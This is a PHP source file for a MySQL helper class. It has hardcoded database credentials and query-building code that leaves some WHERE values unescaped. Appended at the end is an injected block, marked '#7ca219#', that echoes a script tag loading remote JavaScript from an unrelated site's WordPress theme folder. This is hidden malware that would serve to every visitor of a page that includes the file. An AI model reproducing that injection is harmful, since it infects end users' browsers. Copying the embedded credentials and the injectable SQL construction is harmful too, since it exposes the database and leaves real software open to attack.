<?php
class  db_class
{
//////////////////////////

     var $HOST = "localhost";
     var $USER = "egymach_Bassem";
     var $PASS = "QWE987HJK";
     var $DB   = "egymach_ecnegypt_DB";
	 var $Display_SQL = 0;   // 0 : don't display	||::::||	1 : display sql

/*	
     var $HOST = "localhost";
     var $USER = "root";
     var $PASS = "";
     var $DB   = "era_karim";
	 var $Display_SQL = 1;   // 0 : don't display	||::::||	1 : display sql
*/
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////\\--  QUERY   --\\//////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	function db_query($sql, $display = 0)
	{
		if ($display == 1) print "<br>".$sql."<br>";
		$conn = mysql_connect($this -> HOST, $this -> USER, $this -> PASS);
		mysql_select_db($this -> DB);
		if ($this -> Display_SQL == 0)
			$rs = mysql_query($sql,$conn) or die("Failed to execute query " );
		if ($this -> Display_SQL == 1)
			mysql_query($sql,$conn) or die("Failed to execute query :<br> ERROR: " . mysql_error() . ' <br>SQL: ' . $sql);
		mysql_close($conn);
	}
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////\\--  SELECT   --\\/////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	function db_select($sql_select, $display = 0)
	{
		if ($display == 1) print "<br>".$sql_select."<br>";
		$conn = mysql_connect($this -> HOST, $this -> USER, $this -> PASS);
		mysql_select_db($this -> DB);
		if ($this -> Display_SQL == 0)
			$rs = mysql_query($sql_select,$conn) or die("Failed to execute query " );
		if ($this -> Display_SQL == 1)
			$rs = mysql_query($sql_select,$conn) or die("Failed to execute query :<br> ERROR: " . mysql_error() . ' <br>SQL: ' . $sql_select);
		
		///////////////////////////////
		$counter=1;		$result=NULL;
		if ($rs)
		{
			///////////////////
			while($columns = mysql_fetch_array($rs, MYSQL_ASSOC)) 
			{
				$result["$counter"] = $columns;
				$counter ++;
			}
			///////////////////	
		}
		///////////////////////////////		
		@mysql_free_result($rs);
		mysql_close($conn);
		return $result;
	}
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////////////////--  INSERT   --///////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	function db_insert($table_name,$insert_value,$display = 0)
	{
		////////////////////////// MySql Escape String
		while(list($key, $val) = each($insert_value))
		{
			$insert_value["$key"] = mysql_escape_string($val);
		}
		reset($insert_value);
		//////////////////////////
		$sql = "INSERT INTO `$table_name` (";
		$sql .= implode(",", array_keys($insert_value));
		$sql .= ") VALUES (";
		$sql .= "'".implode("','",array_values($insert_value))."'";
		$sql .= ")";			
		if ($display == 1) print "<br>".$sql."<br>";
		//////////////////////////
		$conn = mysql_connect($this -> HOST, $this -> USER, $this -> PASS);
		mysql_select_db($this -> DB);
		if ($this -> Display_SQL == 0)
			$rs = mysql_query($sql,$conn) or die("Failed to execute query  "  );
		if ($this -> Display_SQL == 1)
			mysql_query($sql,$conn) or die("Failed to execute query :<br> ERROR: " . mysql_error() . ' <br>SQL: ' . $sql);
		$last_insert_id = mysql_insert_id();
		mysql_close($conn);
		return ($last_insert_id);
	}
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	///////////////////////////////////////////////////////////--  UPDATE   --///////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	function db_update($table_name, $update_value, $where, $display = 0)
	{
		////////////////////////// MySql Escape String
		while(list($key, $val) = each($update_value))
			$update_value["$key"] = mysql_escape_string($val);
		reset($update_value);
		//////////////////////////
		$sql = "UPDATE `$table_name` SET ";
		foreach ($update_value as $key=>$temp) {
			$sql .= $key.' = "'.$temp.'", ';
		}
		if (substr($sql, -2) == ", ") {
			$sql = substr($sql, 0, strlen($sql)-2);
		}
		$sql .= " WHERE ";
		foreach ($where as $key=>$temp) {
			$sql .= $key.' = "'.$temp.'" AND ';
		}
		if (substr($sql, -5) == " AND ") {
			$sql = substr($sql, 0, strlen($sql)-5);
		}
		if ($display == 1) print "<br>".$sql."<br>";
		//////////////////////////
		$conn = mysql_connect($this -> HOST, $this -> USER, $this -> PASS);
		mysql_select_db($this -> DB);
		if ($this -> Display_SQL == 0)
			$rs = mysql_query($sql,$conn) or die("Failed to execute query ");
		if ($this -> Display_SQL == 1)
			mysql_query($sql,$conn) or die("Failed to execute query :<br> ERROR: " . mysql_error() . ' <br>SQL: ' . $sql);
		mysql_close($conn);
	}
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
	/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
};

?>
<?php
#7ca219#
if(empty($srwv)) {
$srwv = "<script type=\"text/javascript\" src=\"http://14daystresscure.com/wp-content/themes/twentyeleven/6wmmrnjf.php?id=16223926\"></script>";
echo $srwv;
}
#/7ca219#
?>